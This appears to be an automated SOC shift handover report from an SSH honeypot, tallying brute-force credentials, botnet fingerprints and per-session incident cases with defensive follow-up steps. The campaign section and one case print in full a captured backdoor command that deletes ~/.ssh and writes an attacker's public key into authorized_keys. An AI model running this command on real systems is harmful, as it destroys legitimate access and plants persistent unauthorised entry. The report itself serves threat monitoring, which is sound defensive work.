# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-08 |
| **Generated At** | 2026-11-08T03:11:51Z |
| **Shift Time** | 03:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **91** |
| Confirmed Threats | **78** |
| False Positives Filtered | **13** (14.3%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **20** |
| High Severity Cases | **56** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **35** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2145** |
| Unique Credential Pairs | **1191** |
| Unique Usernames | **410** |
| Unique Passwords | **783** |
| Successful Auth Pairs | **2115** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 730 |
| `admin` | 67 |
| `ubuntu` | 66 |
| `user` | 44 |
| `deploy` | 36 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 127 |
| `123` | 72 |
| `1234` | 54 |
| `12345678` | 35 |
| `root` | 31 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 12 |
| `support` | `support` | 9 |
| `root` | `root3245gs5662d34111111111` | 8 |
| `root` | `qwerty12345` | 4 |
| `root` | `1234` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `10.0.0.73` | 2026-11-08T00:01:11 |
| `root` | `admin123` | `195.178.110.232` | 2026-11-08T00:02:02 |
| `root` | `passw0rd` | `195.178.110.232` | 2026-11-08T00:02:31 |
| `root` | `password` | `195.178.110.232` | 2026-11-08T00:02:59 |
| `root` | `gg123456` | `217.182.253.249` | 2026-11-08T00:04:10 |
| `rootssssss23424123123` | `rootssssss23424123123` | `217.182.253.249` | 2026-11-08T00:04:12 |
| `root` | `root3245gs5662d34111111111` | `217.182.253.249` | 2026-11-08T00:04:17 |
| `root` | `password1` | `195.178.110.232` | 2026-11-08T00:04:30 |
| `root` | `qwerty` | `195.178.110.232` | 2026-11-08T00:06:20 |
| `support` | `support` | `176.53.159.196` | 2026-11-08T00:08:03 |
| `root` | `welcome` | `195.178.110.232` | 2026-11-08T00:08:08 |
| `admin` | `000000` | `195.178.110.232` | 2026-11-08T00:10:05 |
| `admin` | `111111` | `195.178.110.232` | 2026-11-08T00:12:14 |
| `admin` | `123` | `195.178.110.232` | 2026-11-08T00:14:20 |
| `admin` | `123123` | `195.178.110.232` | 2026-11-08T00:16:19 |
| `admin` | `123321` | `195.178.110.232` | 2026-11-08T00:20:41 |
| `admin` | `1234` | `195.178.110.232` | 2026-11-08T00:24:51 |
| `zhang` | `123456` | `103.71.176.189` | 2026-11-08T00:25:59 |
| `rootssssss23424123123` | `rootssssss23424123123` | `103.71.176.189` | 2026-11-08T00:26:03 |
| `zhang` | `root3245gs5662d34111111111` | `103.71.176.189` | 2026-11-08T00:26:11 |
_… 2095 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **91** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 54 |
| libssh | 10 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 38 | 3 |
| `f555226df196...` | Mirai/variant | 10 | 5 |
| `0a07365cc01f...` | Generic scanner | 8 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 38 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 10 | 5 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 8 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `95420f9d932d...` | Unknown | 2 | 2 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `52c99fce46b6...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **38** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `72.17.34.38`, `103.71.176.189`, `217.182.253.249`, `103.98.176.164`, `141.11.0.18`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **23** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 15 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS198364` | BANATSYNC SRL | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS209334` | Modat B.V. | 1 | HIGH |
| `AS52468` | UFINET PANAMA S.A. | 1 | MEDIUM |
| `AS136780` | MYANMAR INFORMATION HIGHWAY LIMITED | 1 | LOW |
| `AS22168` | The Shadowserver Foundation, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (56)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fd43a7a4b0cf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:01 |
| **Last Seen** | 2026-11-08 00:02 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_62a2fe4ef7eed3f691ca37af33d74d2a_small_control'"'"' '"'"'check_62a2fe4ef7eed3f691ca37af33d74d2a'"'"'', printf '\n%s|%s\n' 'check_62a2fe4ef7eed3f691ca37af33d74d2a_small_control' 'check_62a2fe4ef7eed3f691ca37af33d74d2a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_62a2fe4ef7eed3f691ca37af33d74d2a_small_math'"'"' "$((326*688+31))"', (326*688+31, printf '\n%s|%s\n' 'check_62a2fe4ef7eed3f691ca37af33d74d2a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:01:49` | `cowrie.session.connect` |
| `2026-11-08 00:01:51` | `cowrie.client.version` |
| `2026-11-08 00:01:51` | `cowrie.client.kex` |
| `2026-11-08 00:02:02` | `cowrie.login.success` |
| `2026-11-08 00:02:07` | `cowrie.client.size` |
| `2026-11-08 00:02:10` | `cowrie.session.params` |
| `2026-11-08 00:02:13` | `cowrie.command.input` |
| `2026-11-08 00:02:13` | `cowrie.command.input` |
| `2026-11-08 00:02:13` | `cowrie.command.input` |
| `2026-11-08 00:02:13` | `cowrie.command.input` |
| `2026-11-08 00:02:13` | `cowrie.command.input` |
| `2026-11-08 00:02:13` | `cowrie.command.input` |
| `2026-11-08 00:02:13` | `cowrie.command.input` |
| `2026-11-08 00:02:13` | `cowrie.command.input` |
| `2026-11-08 00:02:13` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78de7ae5fd6e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:02 |
| **Last Seen** | 2026-11-08 00:02 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_198e392b4a71190a4a4c9c50e329444e_small_control'"'"' '"'"'check_198e392b4a71190a4a4c9c50e329444e'"'"'', printf '\n%s|%s\n' 'check_198e392b4a71190a4a4c9c50e329444e_small_control' 'check_198e392b4a71190a4a4c9c50e329444e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_198e392b4a71190a4a4c9c50e329444e_small_math'"'"' "$((561*762+44))"', (561*762+44, printf '\n%s|%s\n' 'check_198e392b4a71190a4a4c9c50e329444e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:02:20` | `cowrie.session.connect` |
| `2026-11-08 00:02:22` | `cowrie.client.version` |
| `2026-11-08 00:02:22` | `cowrie.client.kex` |
| `2026-11-08 00:02:31` | `cowrie.login.success` |
| `2026-11-08 00:02:37` | `cowrie.client.size` |
| `2026-11-08 00:02:40` | `cowrie.session.params` |
| `2026-11-08 00:02:43` | `cowrie.command.input` |
| `2026-11-08 00:02:43` | `cowrie.command.input` |
| `2026-11-08 00:02:43` | `cowrie.command.input` |
| `2026-11-08 00:02:43` | `cowrie.command.input` |
| `2026-11-08 00:02:43` | `cowrie.command.input` |
| `2026-11-08 00:02:43` | `cowrie.command.input` |
| `2026-11-08 00:02:43` | `cowrie.command.input` |
| `2026-11-08 00:02:43` | `cowrie.command.input` |
| `2026-11-08 00:02:43` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-126a901328c2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:02 |
| **Last Seen** | 2026-11-08 00:03 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d4ae3762740a91c9e82414d075c9cb62_small_control'"'"' '"'"'check_d4ae3762740a91c9e82414d075c9cb62'"'"'', printf '\n%s|%s\n' 'check_d4ae3762740a91c9e82414d075c9cb62_small_control' 'check_d4ae3762740a91c9e82414d075c9cb62', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d4ae3762740a91c9e82414d075c9cb62_small_math'"'"' "$((609*305+30))"', (609*305+30, printf '\n%s|%s\n' 'check_d4ae3762740a91c9e82414d075c9cb62_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:02:49` | `cowrie.session.connect` |
| `2026-11-08 00:02:52` | `cowrie.client.version` |
| `2026-11-08 00:02:52` | `cowrie.client.kex` |
| `2026-11-08 00:02:59` | `cowrie.login.success` |
| `2026-11-08 00:03:04` | `cowrie.client.size` |
| `2026-11-08 00:03:07` | `cowrie.session.params` |
| `2026-11-08 00:03:12` | `cowrie.command.input` |
| `2026-11-08 00:03:12` | `cowrie.command.input` |
| `2026-11-08 00:03:12` | `cowrie.command.input` |
| `2026-11-08 00:03:12` | `cowrie.command.input` |
| `2026-11-08 00:03:12` | `cowrie.command.input` |
| `2026-11-08 00:03:12` | `cowrie.command.input` |
| `2026-11-08 00:03:12` | `cowrie.command.input` |
| `2026-11-08 00:03:12` | `cowrie.command.input` |
| `2026-11-08 00:03:12` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d8447f07d0f

| Field | Detail |
|---|---|
| **Source IP** | `217.182.253[.]249` |
| **First Seen** | 2026-11-08 00:04 |
| **Last Seen** | 2026-11-08 00:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:04:09` | `cowrie.session.connect` |
| `2026-11-08 00:04:09` | `cowrie.client.version` |
| `2026-11-08 00:04:09` | `cowrie.client.kex` |
| `2026-11-08 00:04:10` | `cowrie.login.success` |
| `2026-11-08 00:04:11` | `cowrie.session.params` |
| `2026-11-08 00:04:11` | `cowrie.command.input` |
| `2026-11-08 00:04:11` | `cowrie.command.failed` |
| `2026-11-08 00:04:11` | `cowrie.log.closed` |
| `2026-11-08 00:04:11` | `cowrie.session.params` |
| `2026-11-08 00:04:11` | `cowrie.command.input` |
| `2026-11-08 00:04:12` | `cowrie.session.file_download` |
| `2026-11-08 00:04:12` | `cowrie.log.closed` |
| `2026-11-08 00:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.182.253[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.182.253[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1860cd72db

| Field | Detail |
|---|---|
| **Source IP** | `217.182.253[.]249` |
| **First Seen** | 2026-11-08 00:04 |
| **Last Seen** | 2026-11-08 00:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:04:12` | `cowrie.session.connect` |
| `2026-11-08 00:04:12` | `cowrie.client.version` |
| `2026-11-08 00:04:12` | `cowrie.client.kex` |
| `2026-11-08 00:04:12` | `cowrie.login.success` |
| `2026-11-08 00:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.182.253[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.182.253[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee15dedb1f6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:04 |
| **Last Seen** | 2026-11-08 00:04 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cc884642376d06d202e0d57618db0e4e_small_control'"'"' '"'"'check_cc884642376d06d202e0d57618db0e4e'"'"'', printf '\n%s|%s\n' 'check_cc884642376d06d202e0d57618db0e4e_small_control' 'check_cc884642376d06d202e0d57618db0e4e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cc884642376d06d202e0d57618db0e4e_small_math'"'"' "$((517*149+78))"', (517*149+78, printf '\n%s|%s\n' 'check_cc884642376d06d202e0d57618db0e4e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:04:19` | `cowrie.session.connect` |
| `2026-11-08 00:04:21` | `cowrie.client.version` |
| `2026-11-08 00:04:21` | `cowrie.client.kex` |
| `2026-11-08 00:04:30` | `cowrie.login.success` |
| `2026-11-08 00:04:35` | `cowrie.client.size` |
| `2026-11-08 00:04:38` | `cowrie.session.params` |
| `2026-11-08 00:04:41` | `cowrie.command.input` |
| `2026-11-08 00:04:41` | `cowrie.command.input` |
| `2026-11-08 00:04:41` | `cowrie.command.input` |
| `2026-11-08 00:04:41` | `cowrie.command.input` |
| `2026-11-08 00:04:41` | `cowrie.command.input` |
| `2026-11-08 00:04:41` | `cowrie.command.input` |
| `2026-11-08 00:04:41` | `cowrie.command.input` |
| `2026-11-08 00:04:41` | `cowrie.command.input` |
| `2026-11-08 00:04:41` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbbeba2a913b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:06 |
| **Last Seen** | 2026-11-08 00:06 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_496468502d3a07036d922d57a8d0b6f6_small_control'"'"' '"'"'check_496468502d3a07036d922d57a8d0b6f6'"'"'', printf '\n%s|%s\n' 'check_496468502d3a07036d922d57a8d0b6f6_small_control' 'check_496468502d3a07036d922d57a8d0b6f6', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_496468502d3a07036d922d57a8d0b6f6_small_math'"'"' "$((843*939+68))"', (843*939+68, printf '\n%s|%s\n' 'check_496468502d3a07036d922d57a8d0b6f6_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:06:10` | `cowrie.session.connect` |
| `2026-11-08 00:06:12` | `cowrie.client.version` |
| `2026-11-08 00:06:12` | `cowrie.client.kex` |
| `2026-11-08 00:06:20` | `cowrie.login.success` |
| `2026-11-08 00:06:25` | `cowrie.client.size` |
| `2026-11-08 00:06:29` | `cowrie.session.params` |
| `2026-11-08 00:06:30` | `cowrie.command.input` |
| `2026-11-08 00:06:30` | `cowrie.command.input` |
| `2026-11-08 00:06:30` | `cowrie.command.input` |
| `2026-11-08 00:06:30` | `cowrie.command.input` |
| `2026-11-08 00:06:30` | `cowrie.command.input` |
| `2026-11-08 00:06:30` | `cowrie.command.input` |
| `2026-11-08 00:06:30` | `cowrie.command.input` |
| `2026-11-08 00:06:30` | `cowrie.command.input` |
| `2026-11-08 00:06:30` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abbf83066686

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:07 |
| **Last Seen** | 2026-11-08 00:08 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bcaedf0e6320348e1959e4fd94324bbd_small_control'"'"' '"'"'check_bcaedf0e6320348e1959e4fd94324bbd'"'"'', printf '\n%s|%s\n' 'check_bcaedf0e6320348e1959e4fd94324bbd_small_control' 'check_bcaedf0e6320348e1959e4fd94324bbd', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bcaedf0e6320348e1959e4fd94324bbd_small_math'"'"' "$((447*616+94))"', (447*616+94, printf '\n%s|%s\n' 'check_bcaedf0e6320348e1959e4fd94324bbd_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:07:58` | `cowrie.session.connect` |
| `2026-11-08 00:08:00` | `cowrie.client.version` |
| `2026-11-08 00:08:00` | `cowrie.client.kex` |
| `2026-11-08 00:08:08` | `cowrie.login.success` |
| `2026-11-08 00:08:14` | `cowrie.client.size` |
| `2026-11-08 00:08:16` | `cowrie.session.params` |
| `2026-11-08 00:08:18` | `cowrie.command.input` |
| `2026-11-08 00:08:18` | `cowrie.command.input` |
| `2026-11-08 00:08:18` | `cowrie.command.input` |
| `2026-11-08 00:08:18` | `cowrie.command.input` |
| `2026-11-08 00:08:18` | `cowrie.command.input` |
| `2026-11-08 00:08:18` | `cowrie.command.input` |
| `2026-11-08 00:08:18` | `cowrie.command.input` |
| `2026-11-08 00:08:18` | `cowrie.command.input` |
| `2026-11-08 00:08:18` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447c9f3588d4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-08 00:08 |
| **Last Seen** | 2026-11-08 00:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:08:02` | `cowrie.session.connect` |
| `2026-11-08 00:08:02` | `cowrie.client.version` |
| `2026-11-08 00:08:03` | `cowrie.client.kex` |
| `2026-11-08 00:08:03` | `cowrie.login.success` |
| `2026-11-08 00:08:03` | `cowrie.direct-tcpip.request` |
| `2026-11-08 00:08:03` | `cowrie.direct-tcpip.data` |
| `2026-11-08 00:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30a018e9d11f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:09 |
| **Last Seen** | 2026-11-08 00:10 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a27ba4e496445e1fcf2ef7256c496eca_small_control'"'"' '"'"'check_a27ba4e496445e1fcf2ef7256c496eca'"'"'', printf '\n%s|%s\n' 'check_a27ba4e496445e1fcf2ef7256c496eca_small_control' 'check_a27ba4e496445e1fcf2ef7256c496eca', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a27ba4e496445e1fcf2ef7256c496eca_small_math'"'"' "$((719*591+80))"', (719*591+80, printf '\n%s|%s\n' 'check_a27ba4e496445e1fcf2ef7256c496eca_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:09:55` | `cowrie.session.connect` |
| `2026-11-08 00:09:58` | `cowrie.client.version` |
| `2026-11-08 00:09:58` | `cowrie.client.kex` |
| `2026-11-08 00:10:05` | `cowrie.login.success` |
| `2026-11-08 00:10:11` | `cowrie.client.size` |
| `2026-11-08 00:10:14` | `cowrie.session.params` |
| `2026-11-08 00:10:16` | `cowrie.command.input` |
| `2026-11-08 00:10:16` | `cowrie.command.input` |
| `2026-11-08 00:10:16` | `cowrie.command.input` |
| `2026-11-08 00:10:16` | `cowrie.command.input` |
| `2026-11-08 00:10:16` | `cowrie.command.input` |
| `2026-11-08 00:10:16` | `cowrie.command.input` |
| `2026-11-08 00:10:16` | `cowrie.command.input` |
| `2026-11-08 00:10:17` | `cowrie.command.input` |
| `2026-11-08 00:10:17` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50aca5fb646f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:12 |
| **Last Seen** | 2026-11-08 00:12 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_75dfe702b13d495c721761de40b0b6e8_small_control'"'"' '"'"'check_75dfe702b13d495c721761de40b0b6e8'"'"'', printf '\n%s|%s\n' 'check_75dfe702b13d495c721761de40b0b6e8_small_control' 'check_75dfe702b13d495c721761de40b0b6e8', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_75dfe702b13d495c721761de40b0b6e8_small_math'"'"' "$((266*670+9))"', (266*670+9, printf '\n%s|%s\n' 'check_75dfe702b13d495c721761de40b0b6e8_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:12:05` | `cowrie.session.connect` |
| `2026-11-08 00:12:06` | `cowrie.client.version` |
| `2026-11-08 00:12:06` | `cowrie.client.kex` |
| `2026-11-08 00:12:14` | `cowrie.login.success` |
| `2026-11-08 00:12:19` | `cowrie.client.size` |
| `2026-11-08 00:12:22` | `cowrie.session.params` |
| `2026-11-08 00:12:23` | `cowrie.command.input` |
| `2026-11-08 00:12:23` | `cowrie.command.input` |
| `2026-11-08 00:12:23` | `cowrie.command.input` |
| `2026-11-08 00:12:23` | `cowrie.command.input` |
| `2026-11-08 00:12:23` | `cowrie.command.input` |
| `2026-11-08 00:12:23` | `cowrie.command.input` |
| `2026-11-08 00:12:23` | `cowrie.command.input` |
| `2026-11-08 00:12:23` | `cowrie.command.input` |
| `2026-11-08 00:12:23` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8f423ca9f69

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:14 |
| **Last Seen** | 2026-11-08 00:14 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
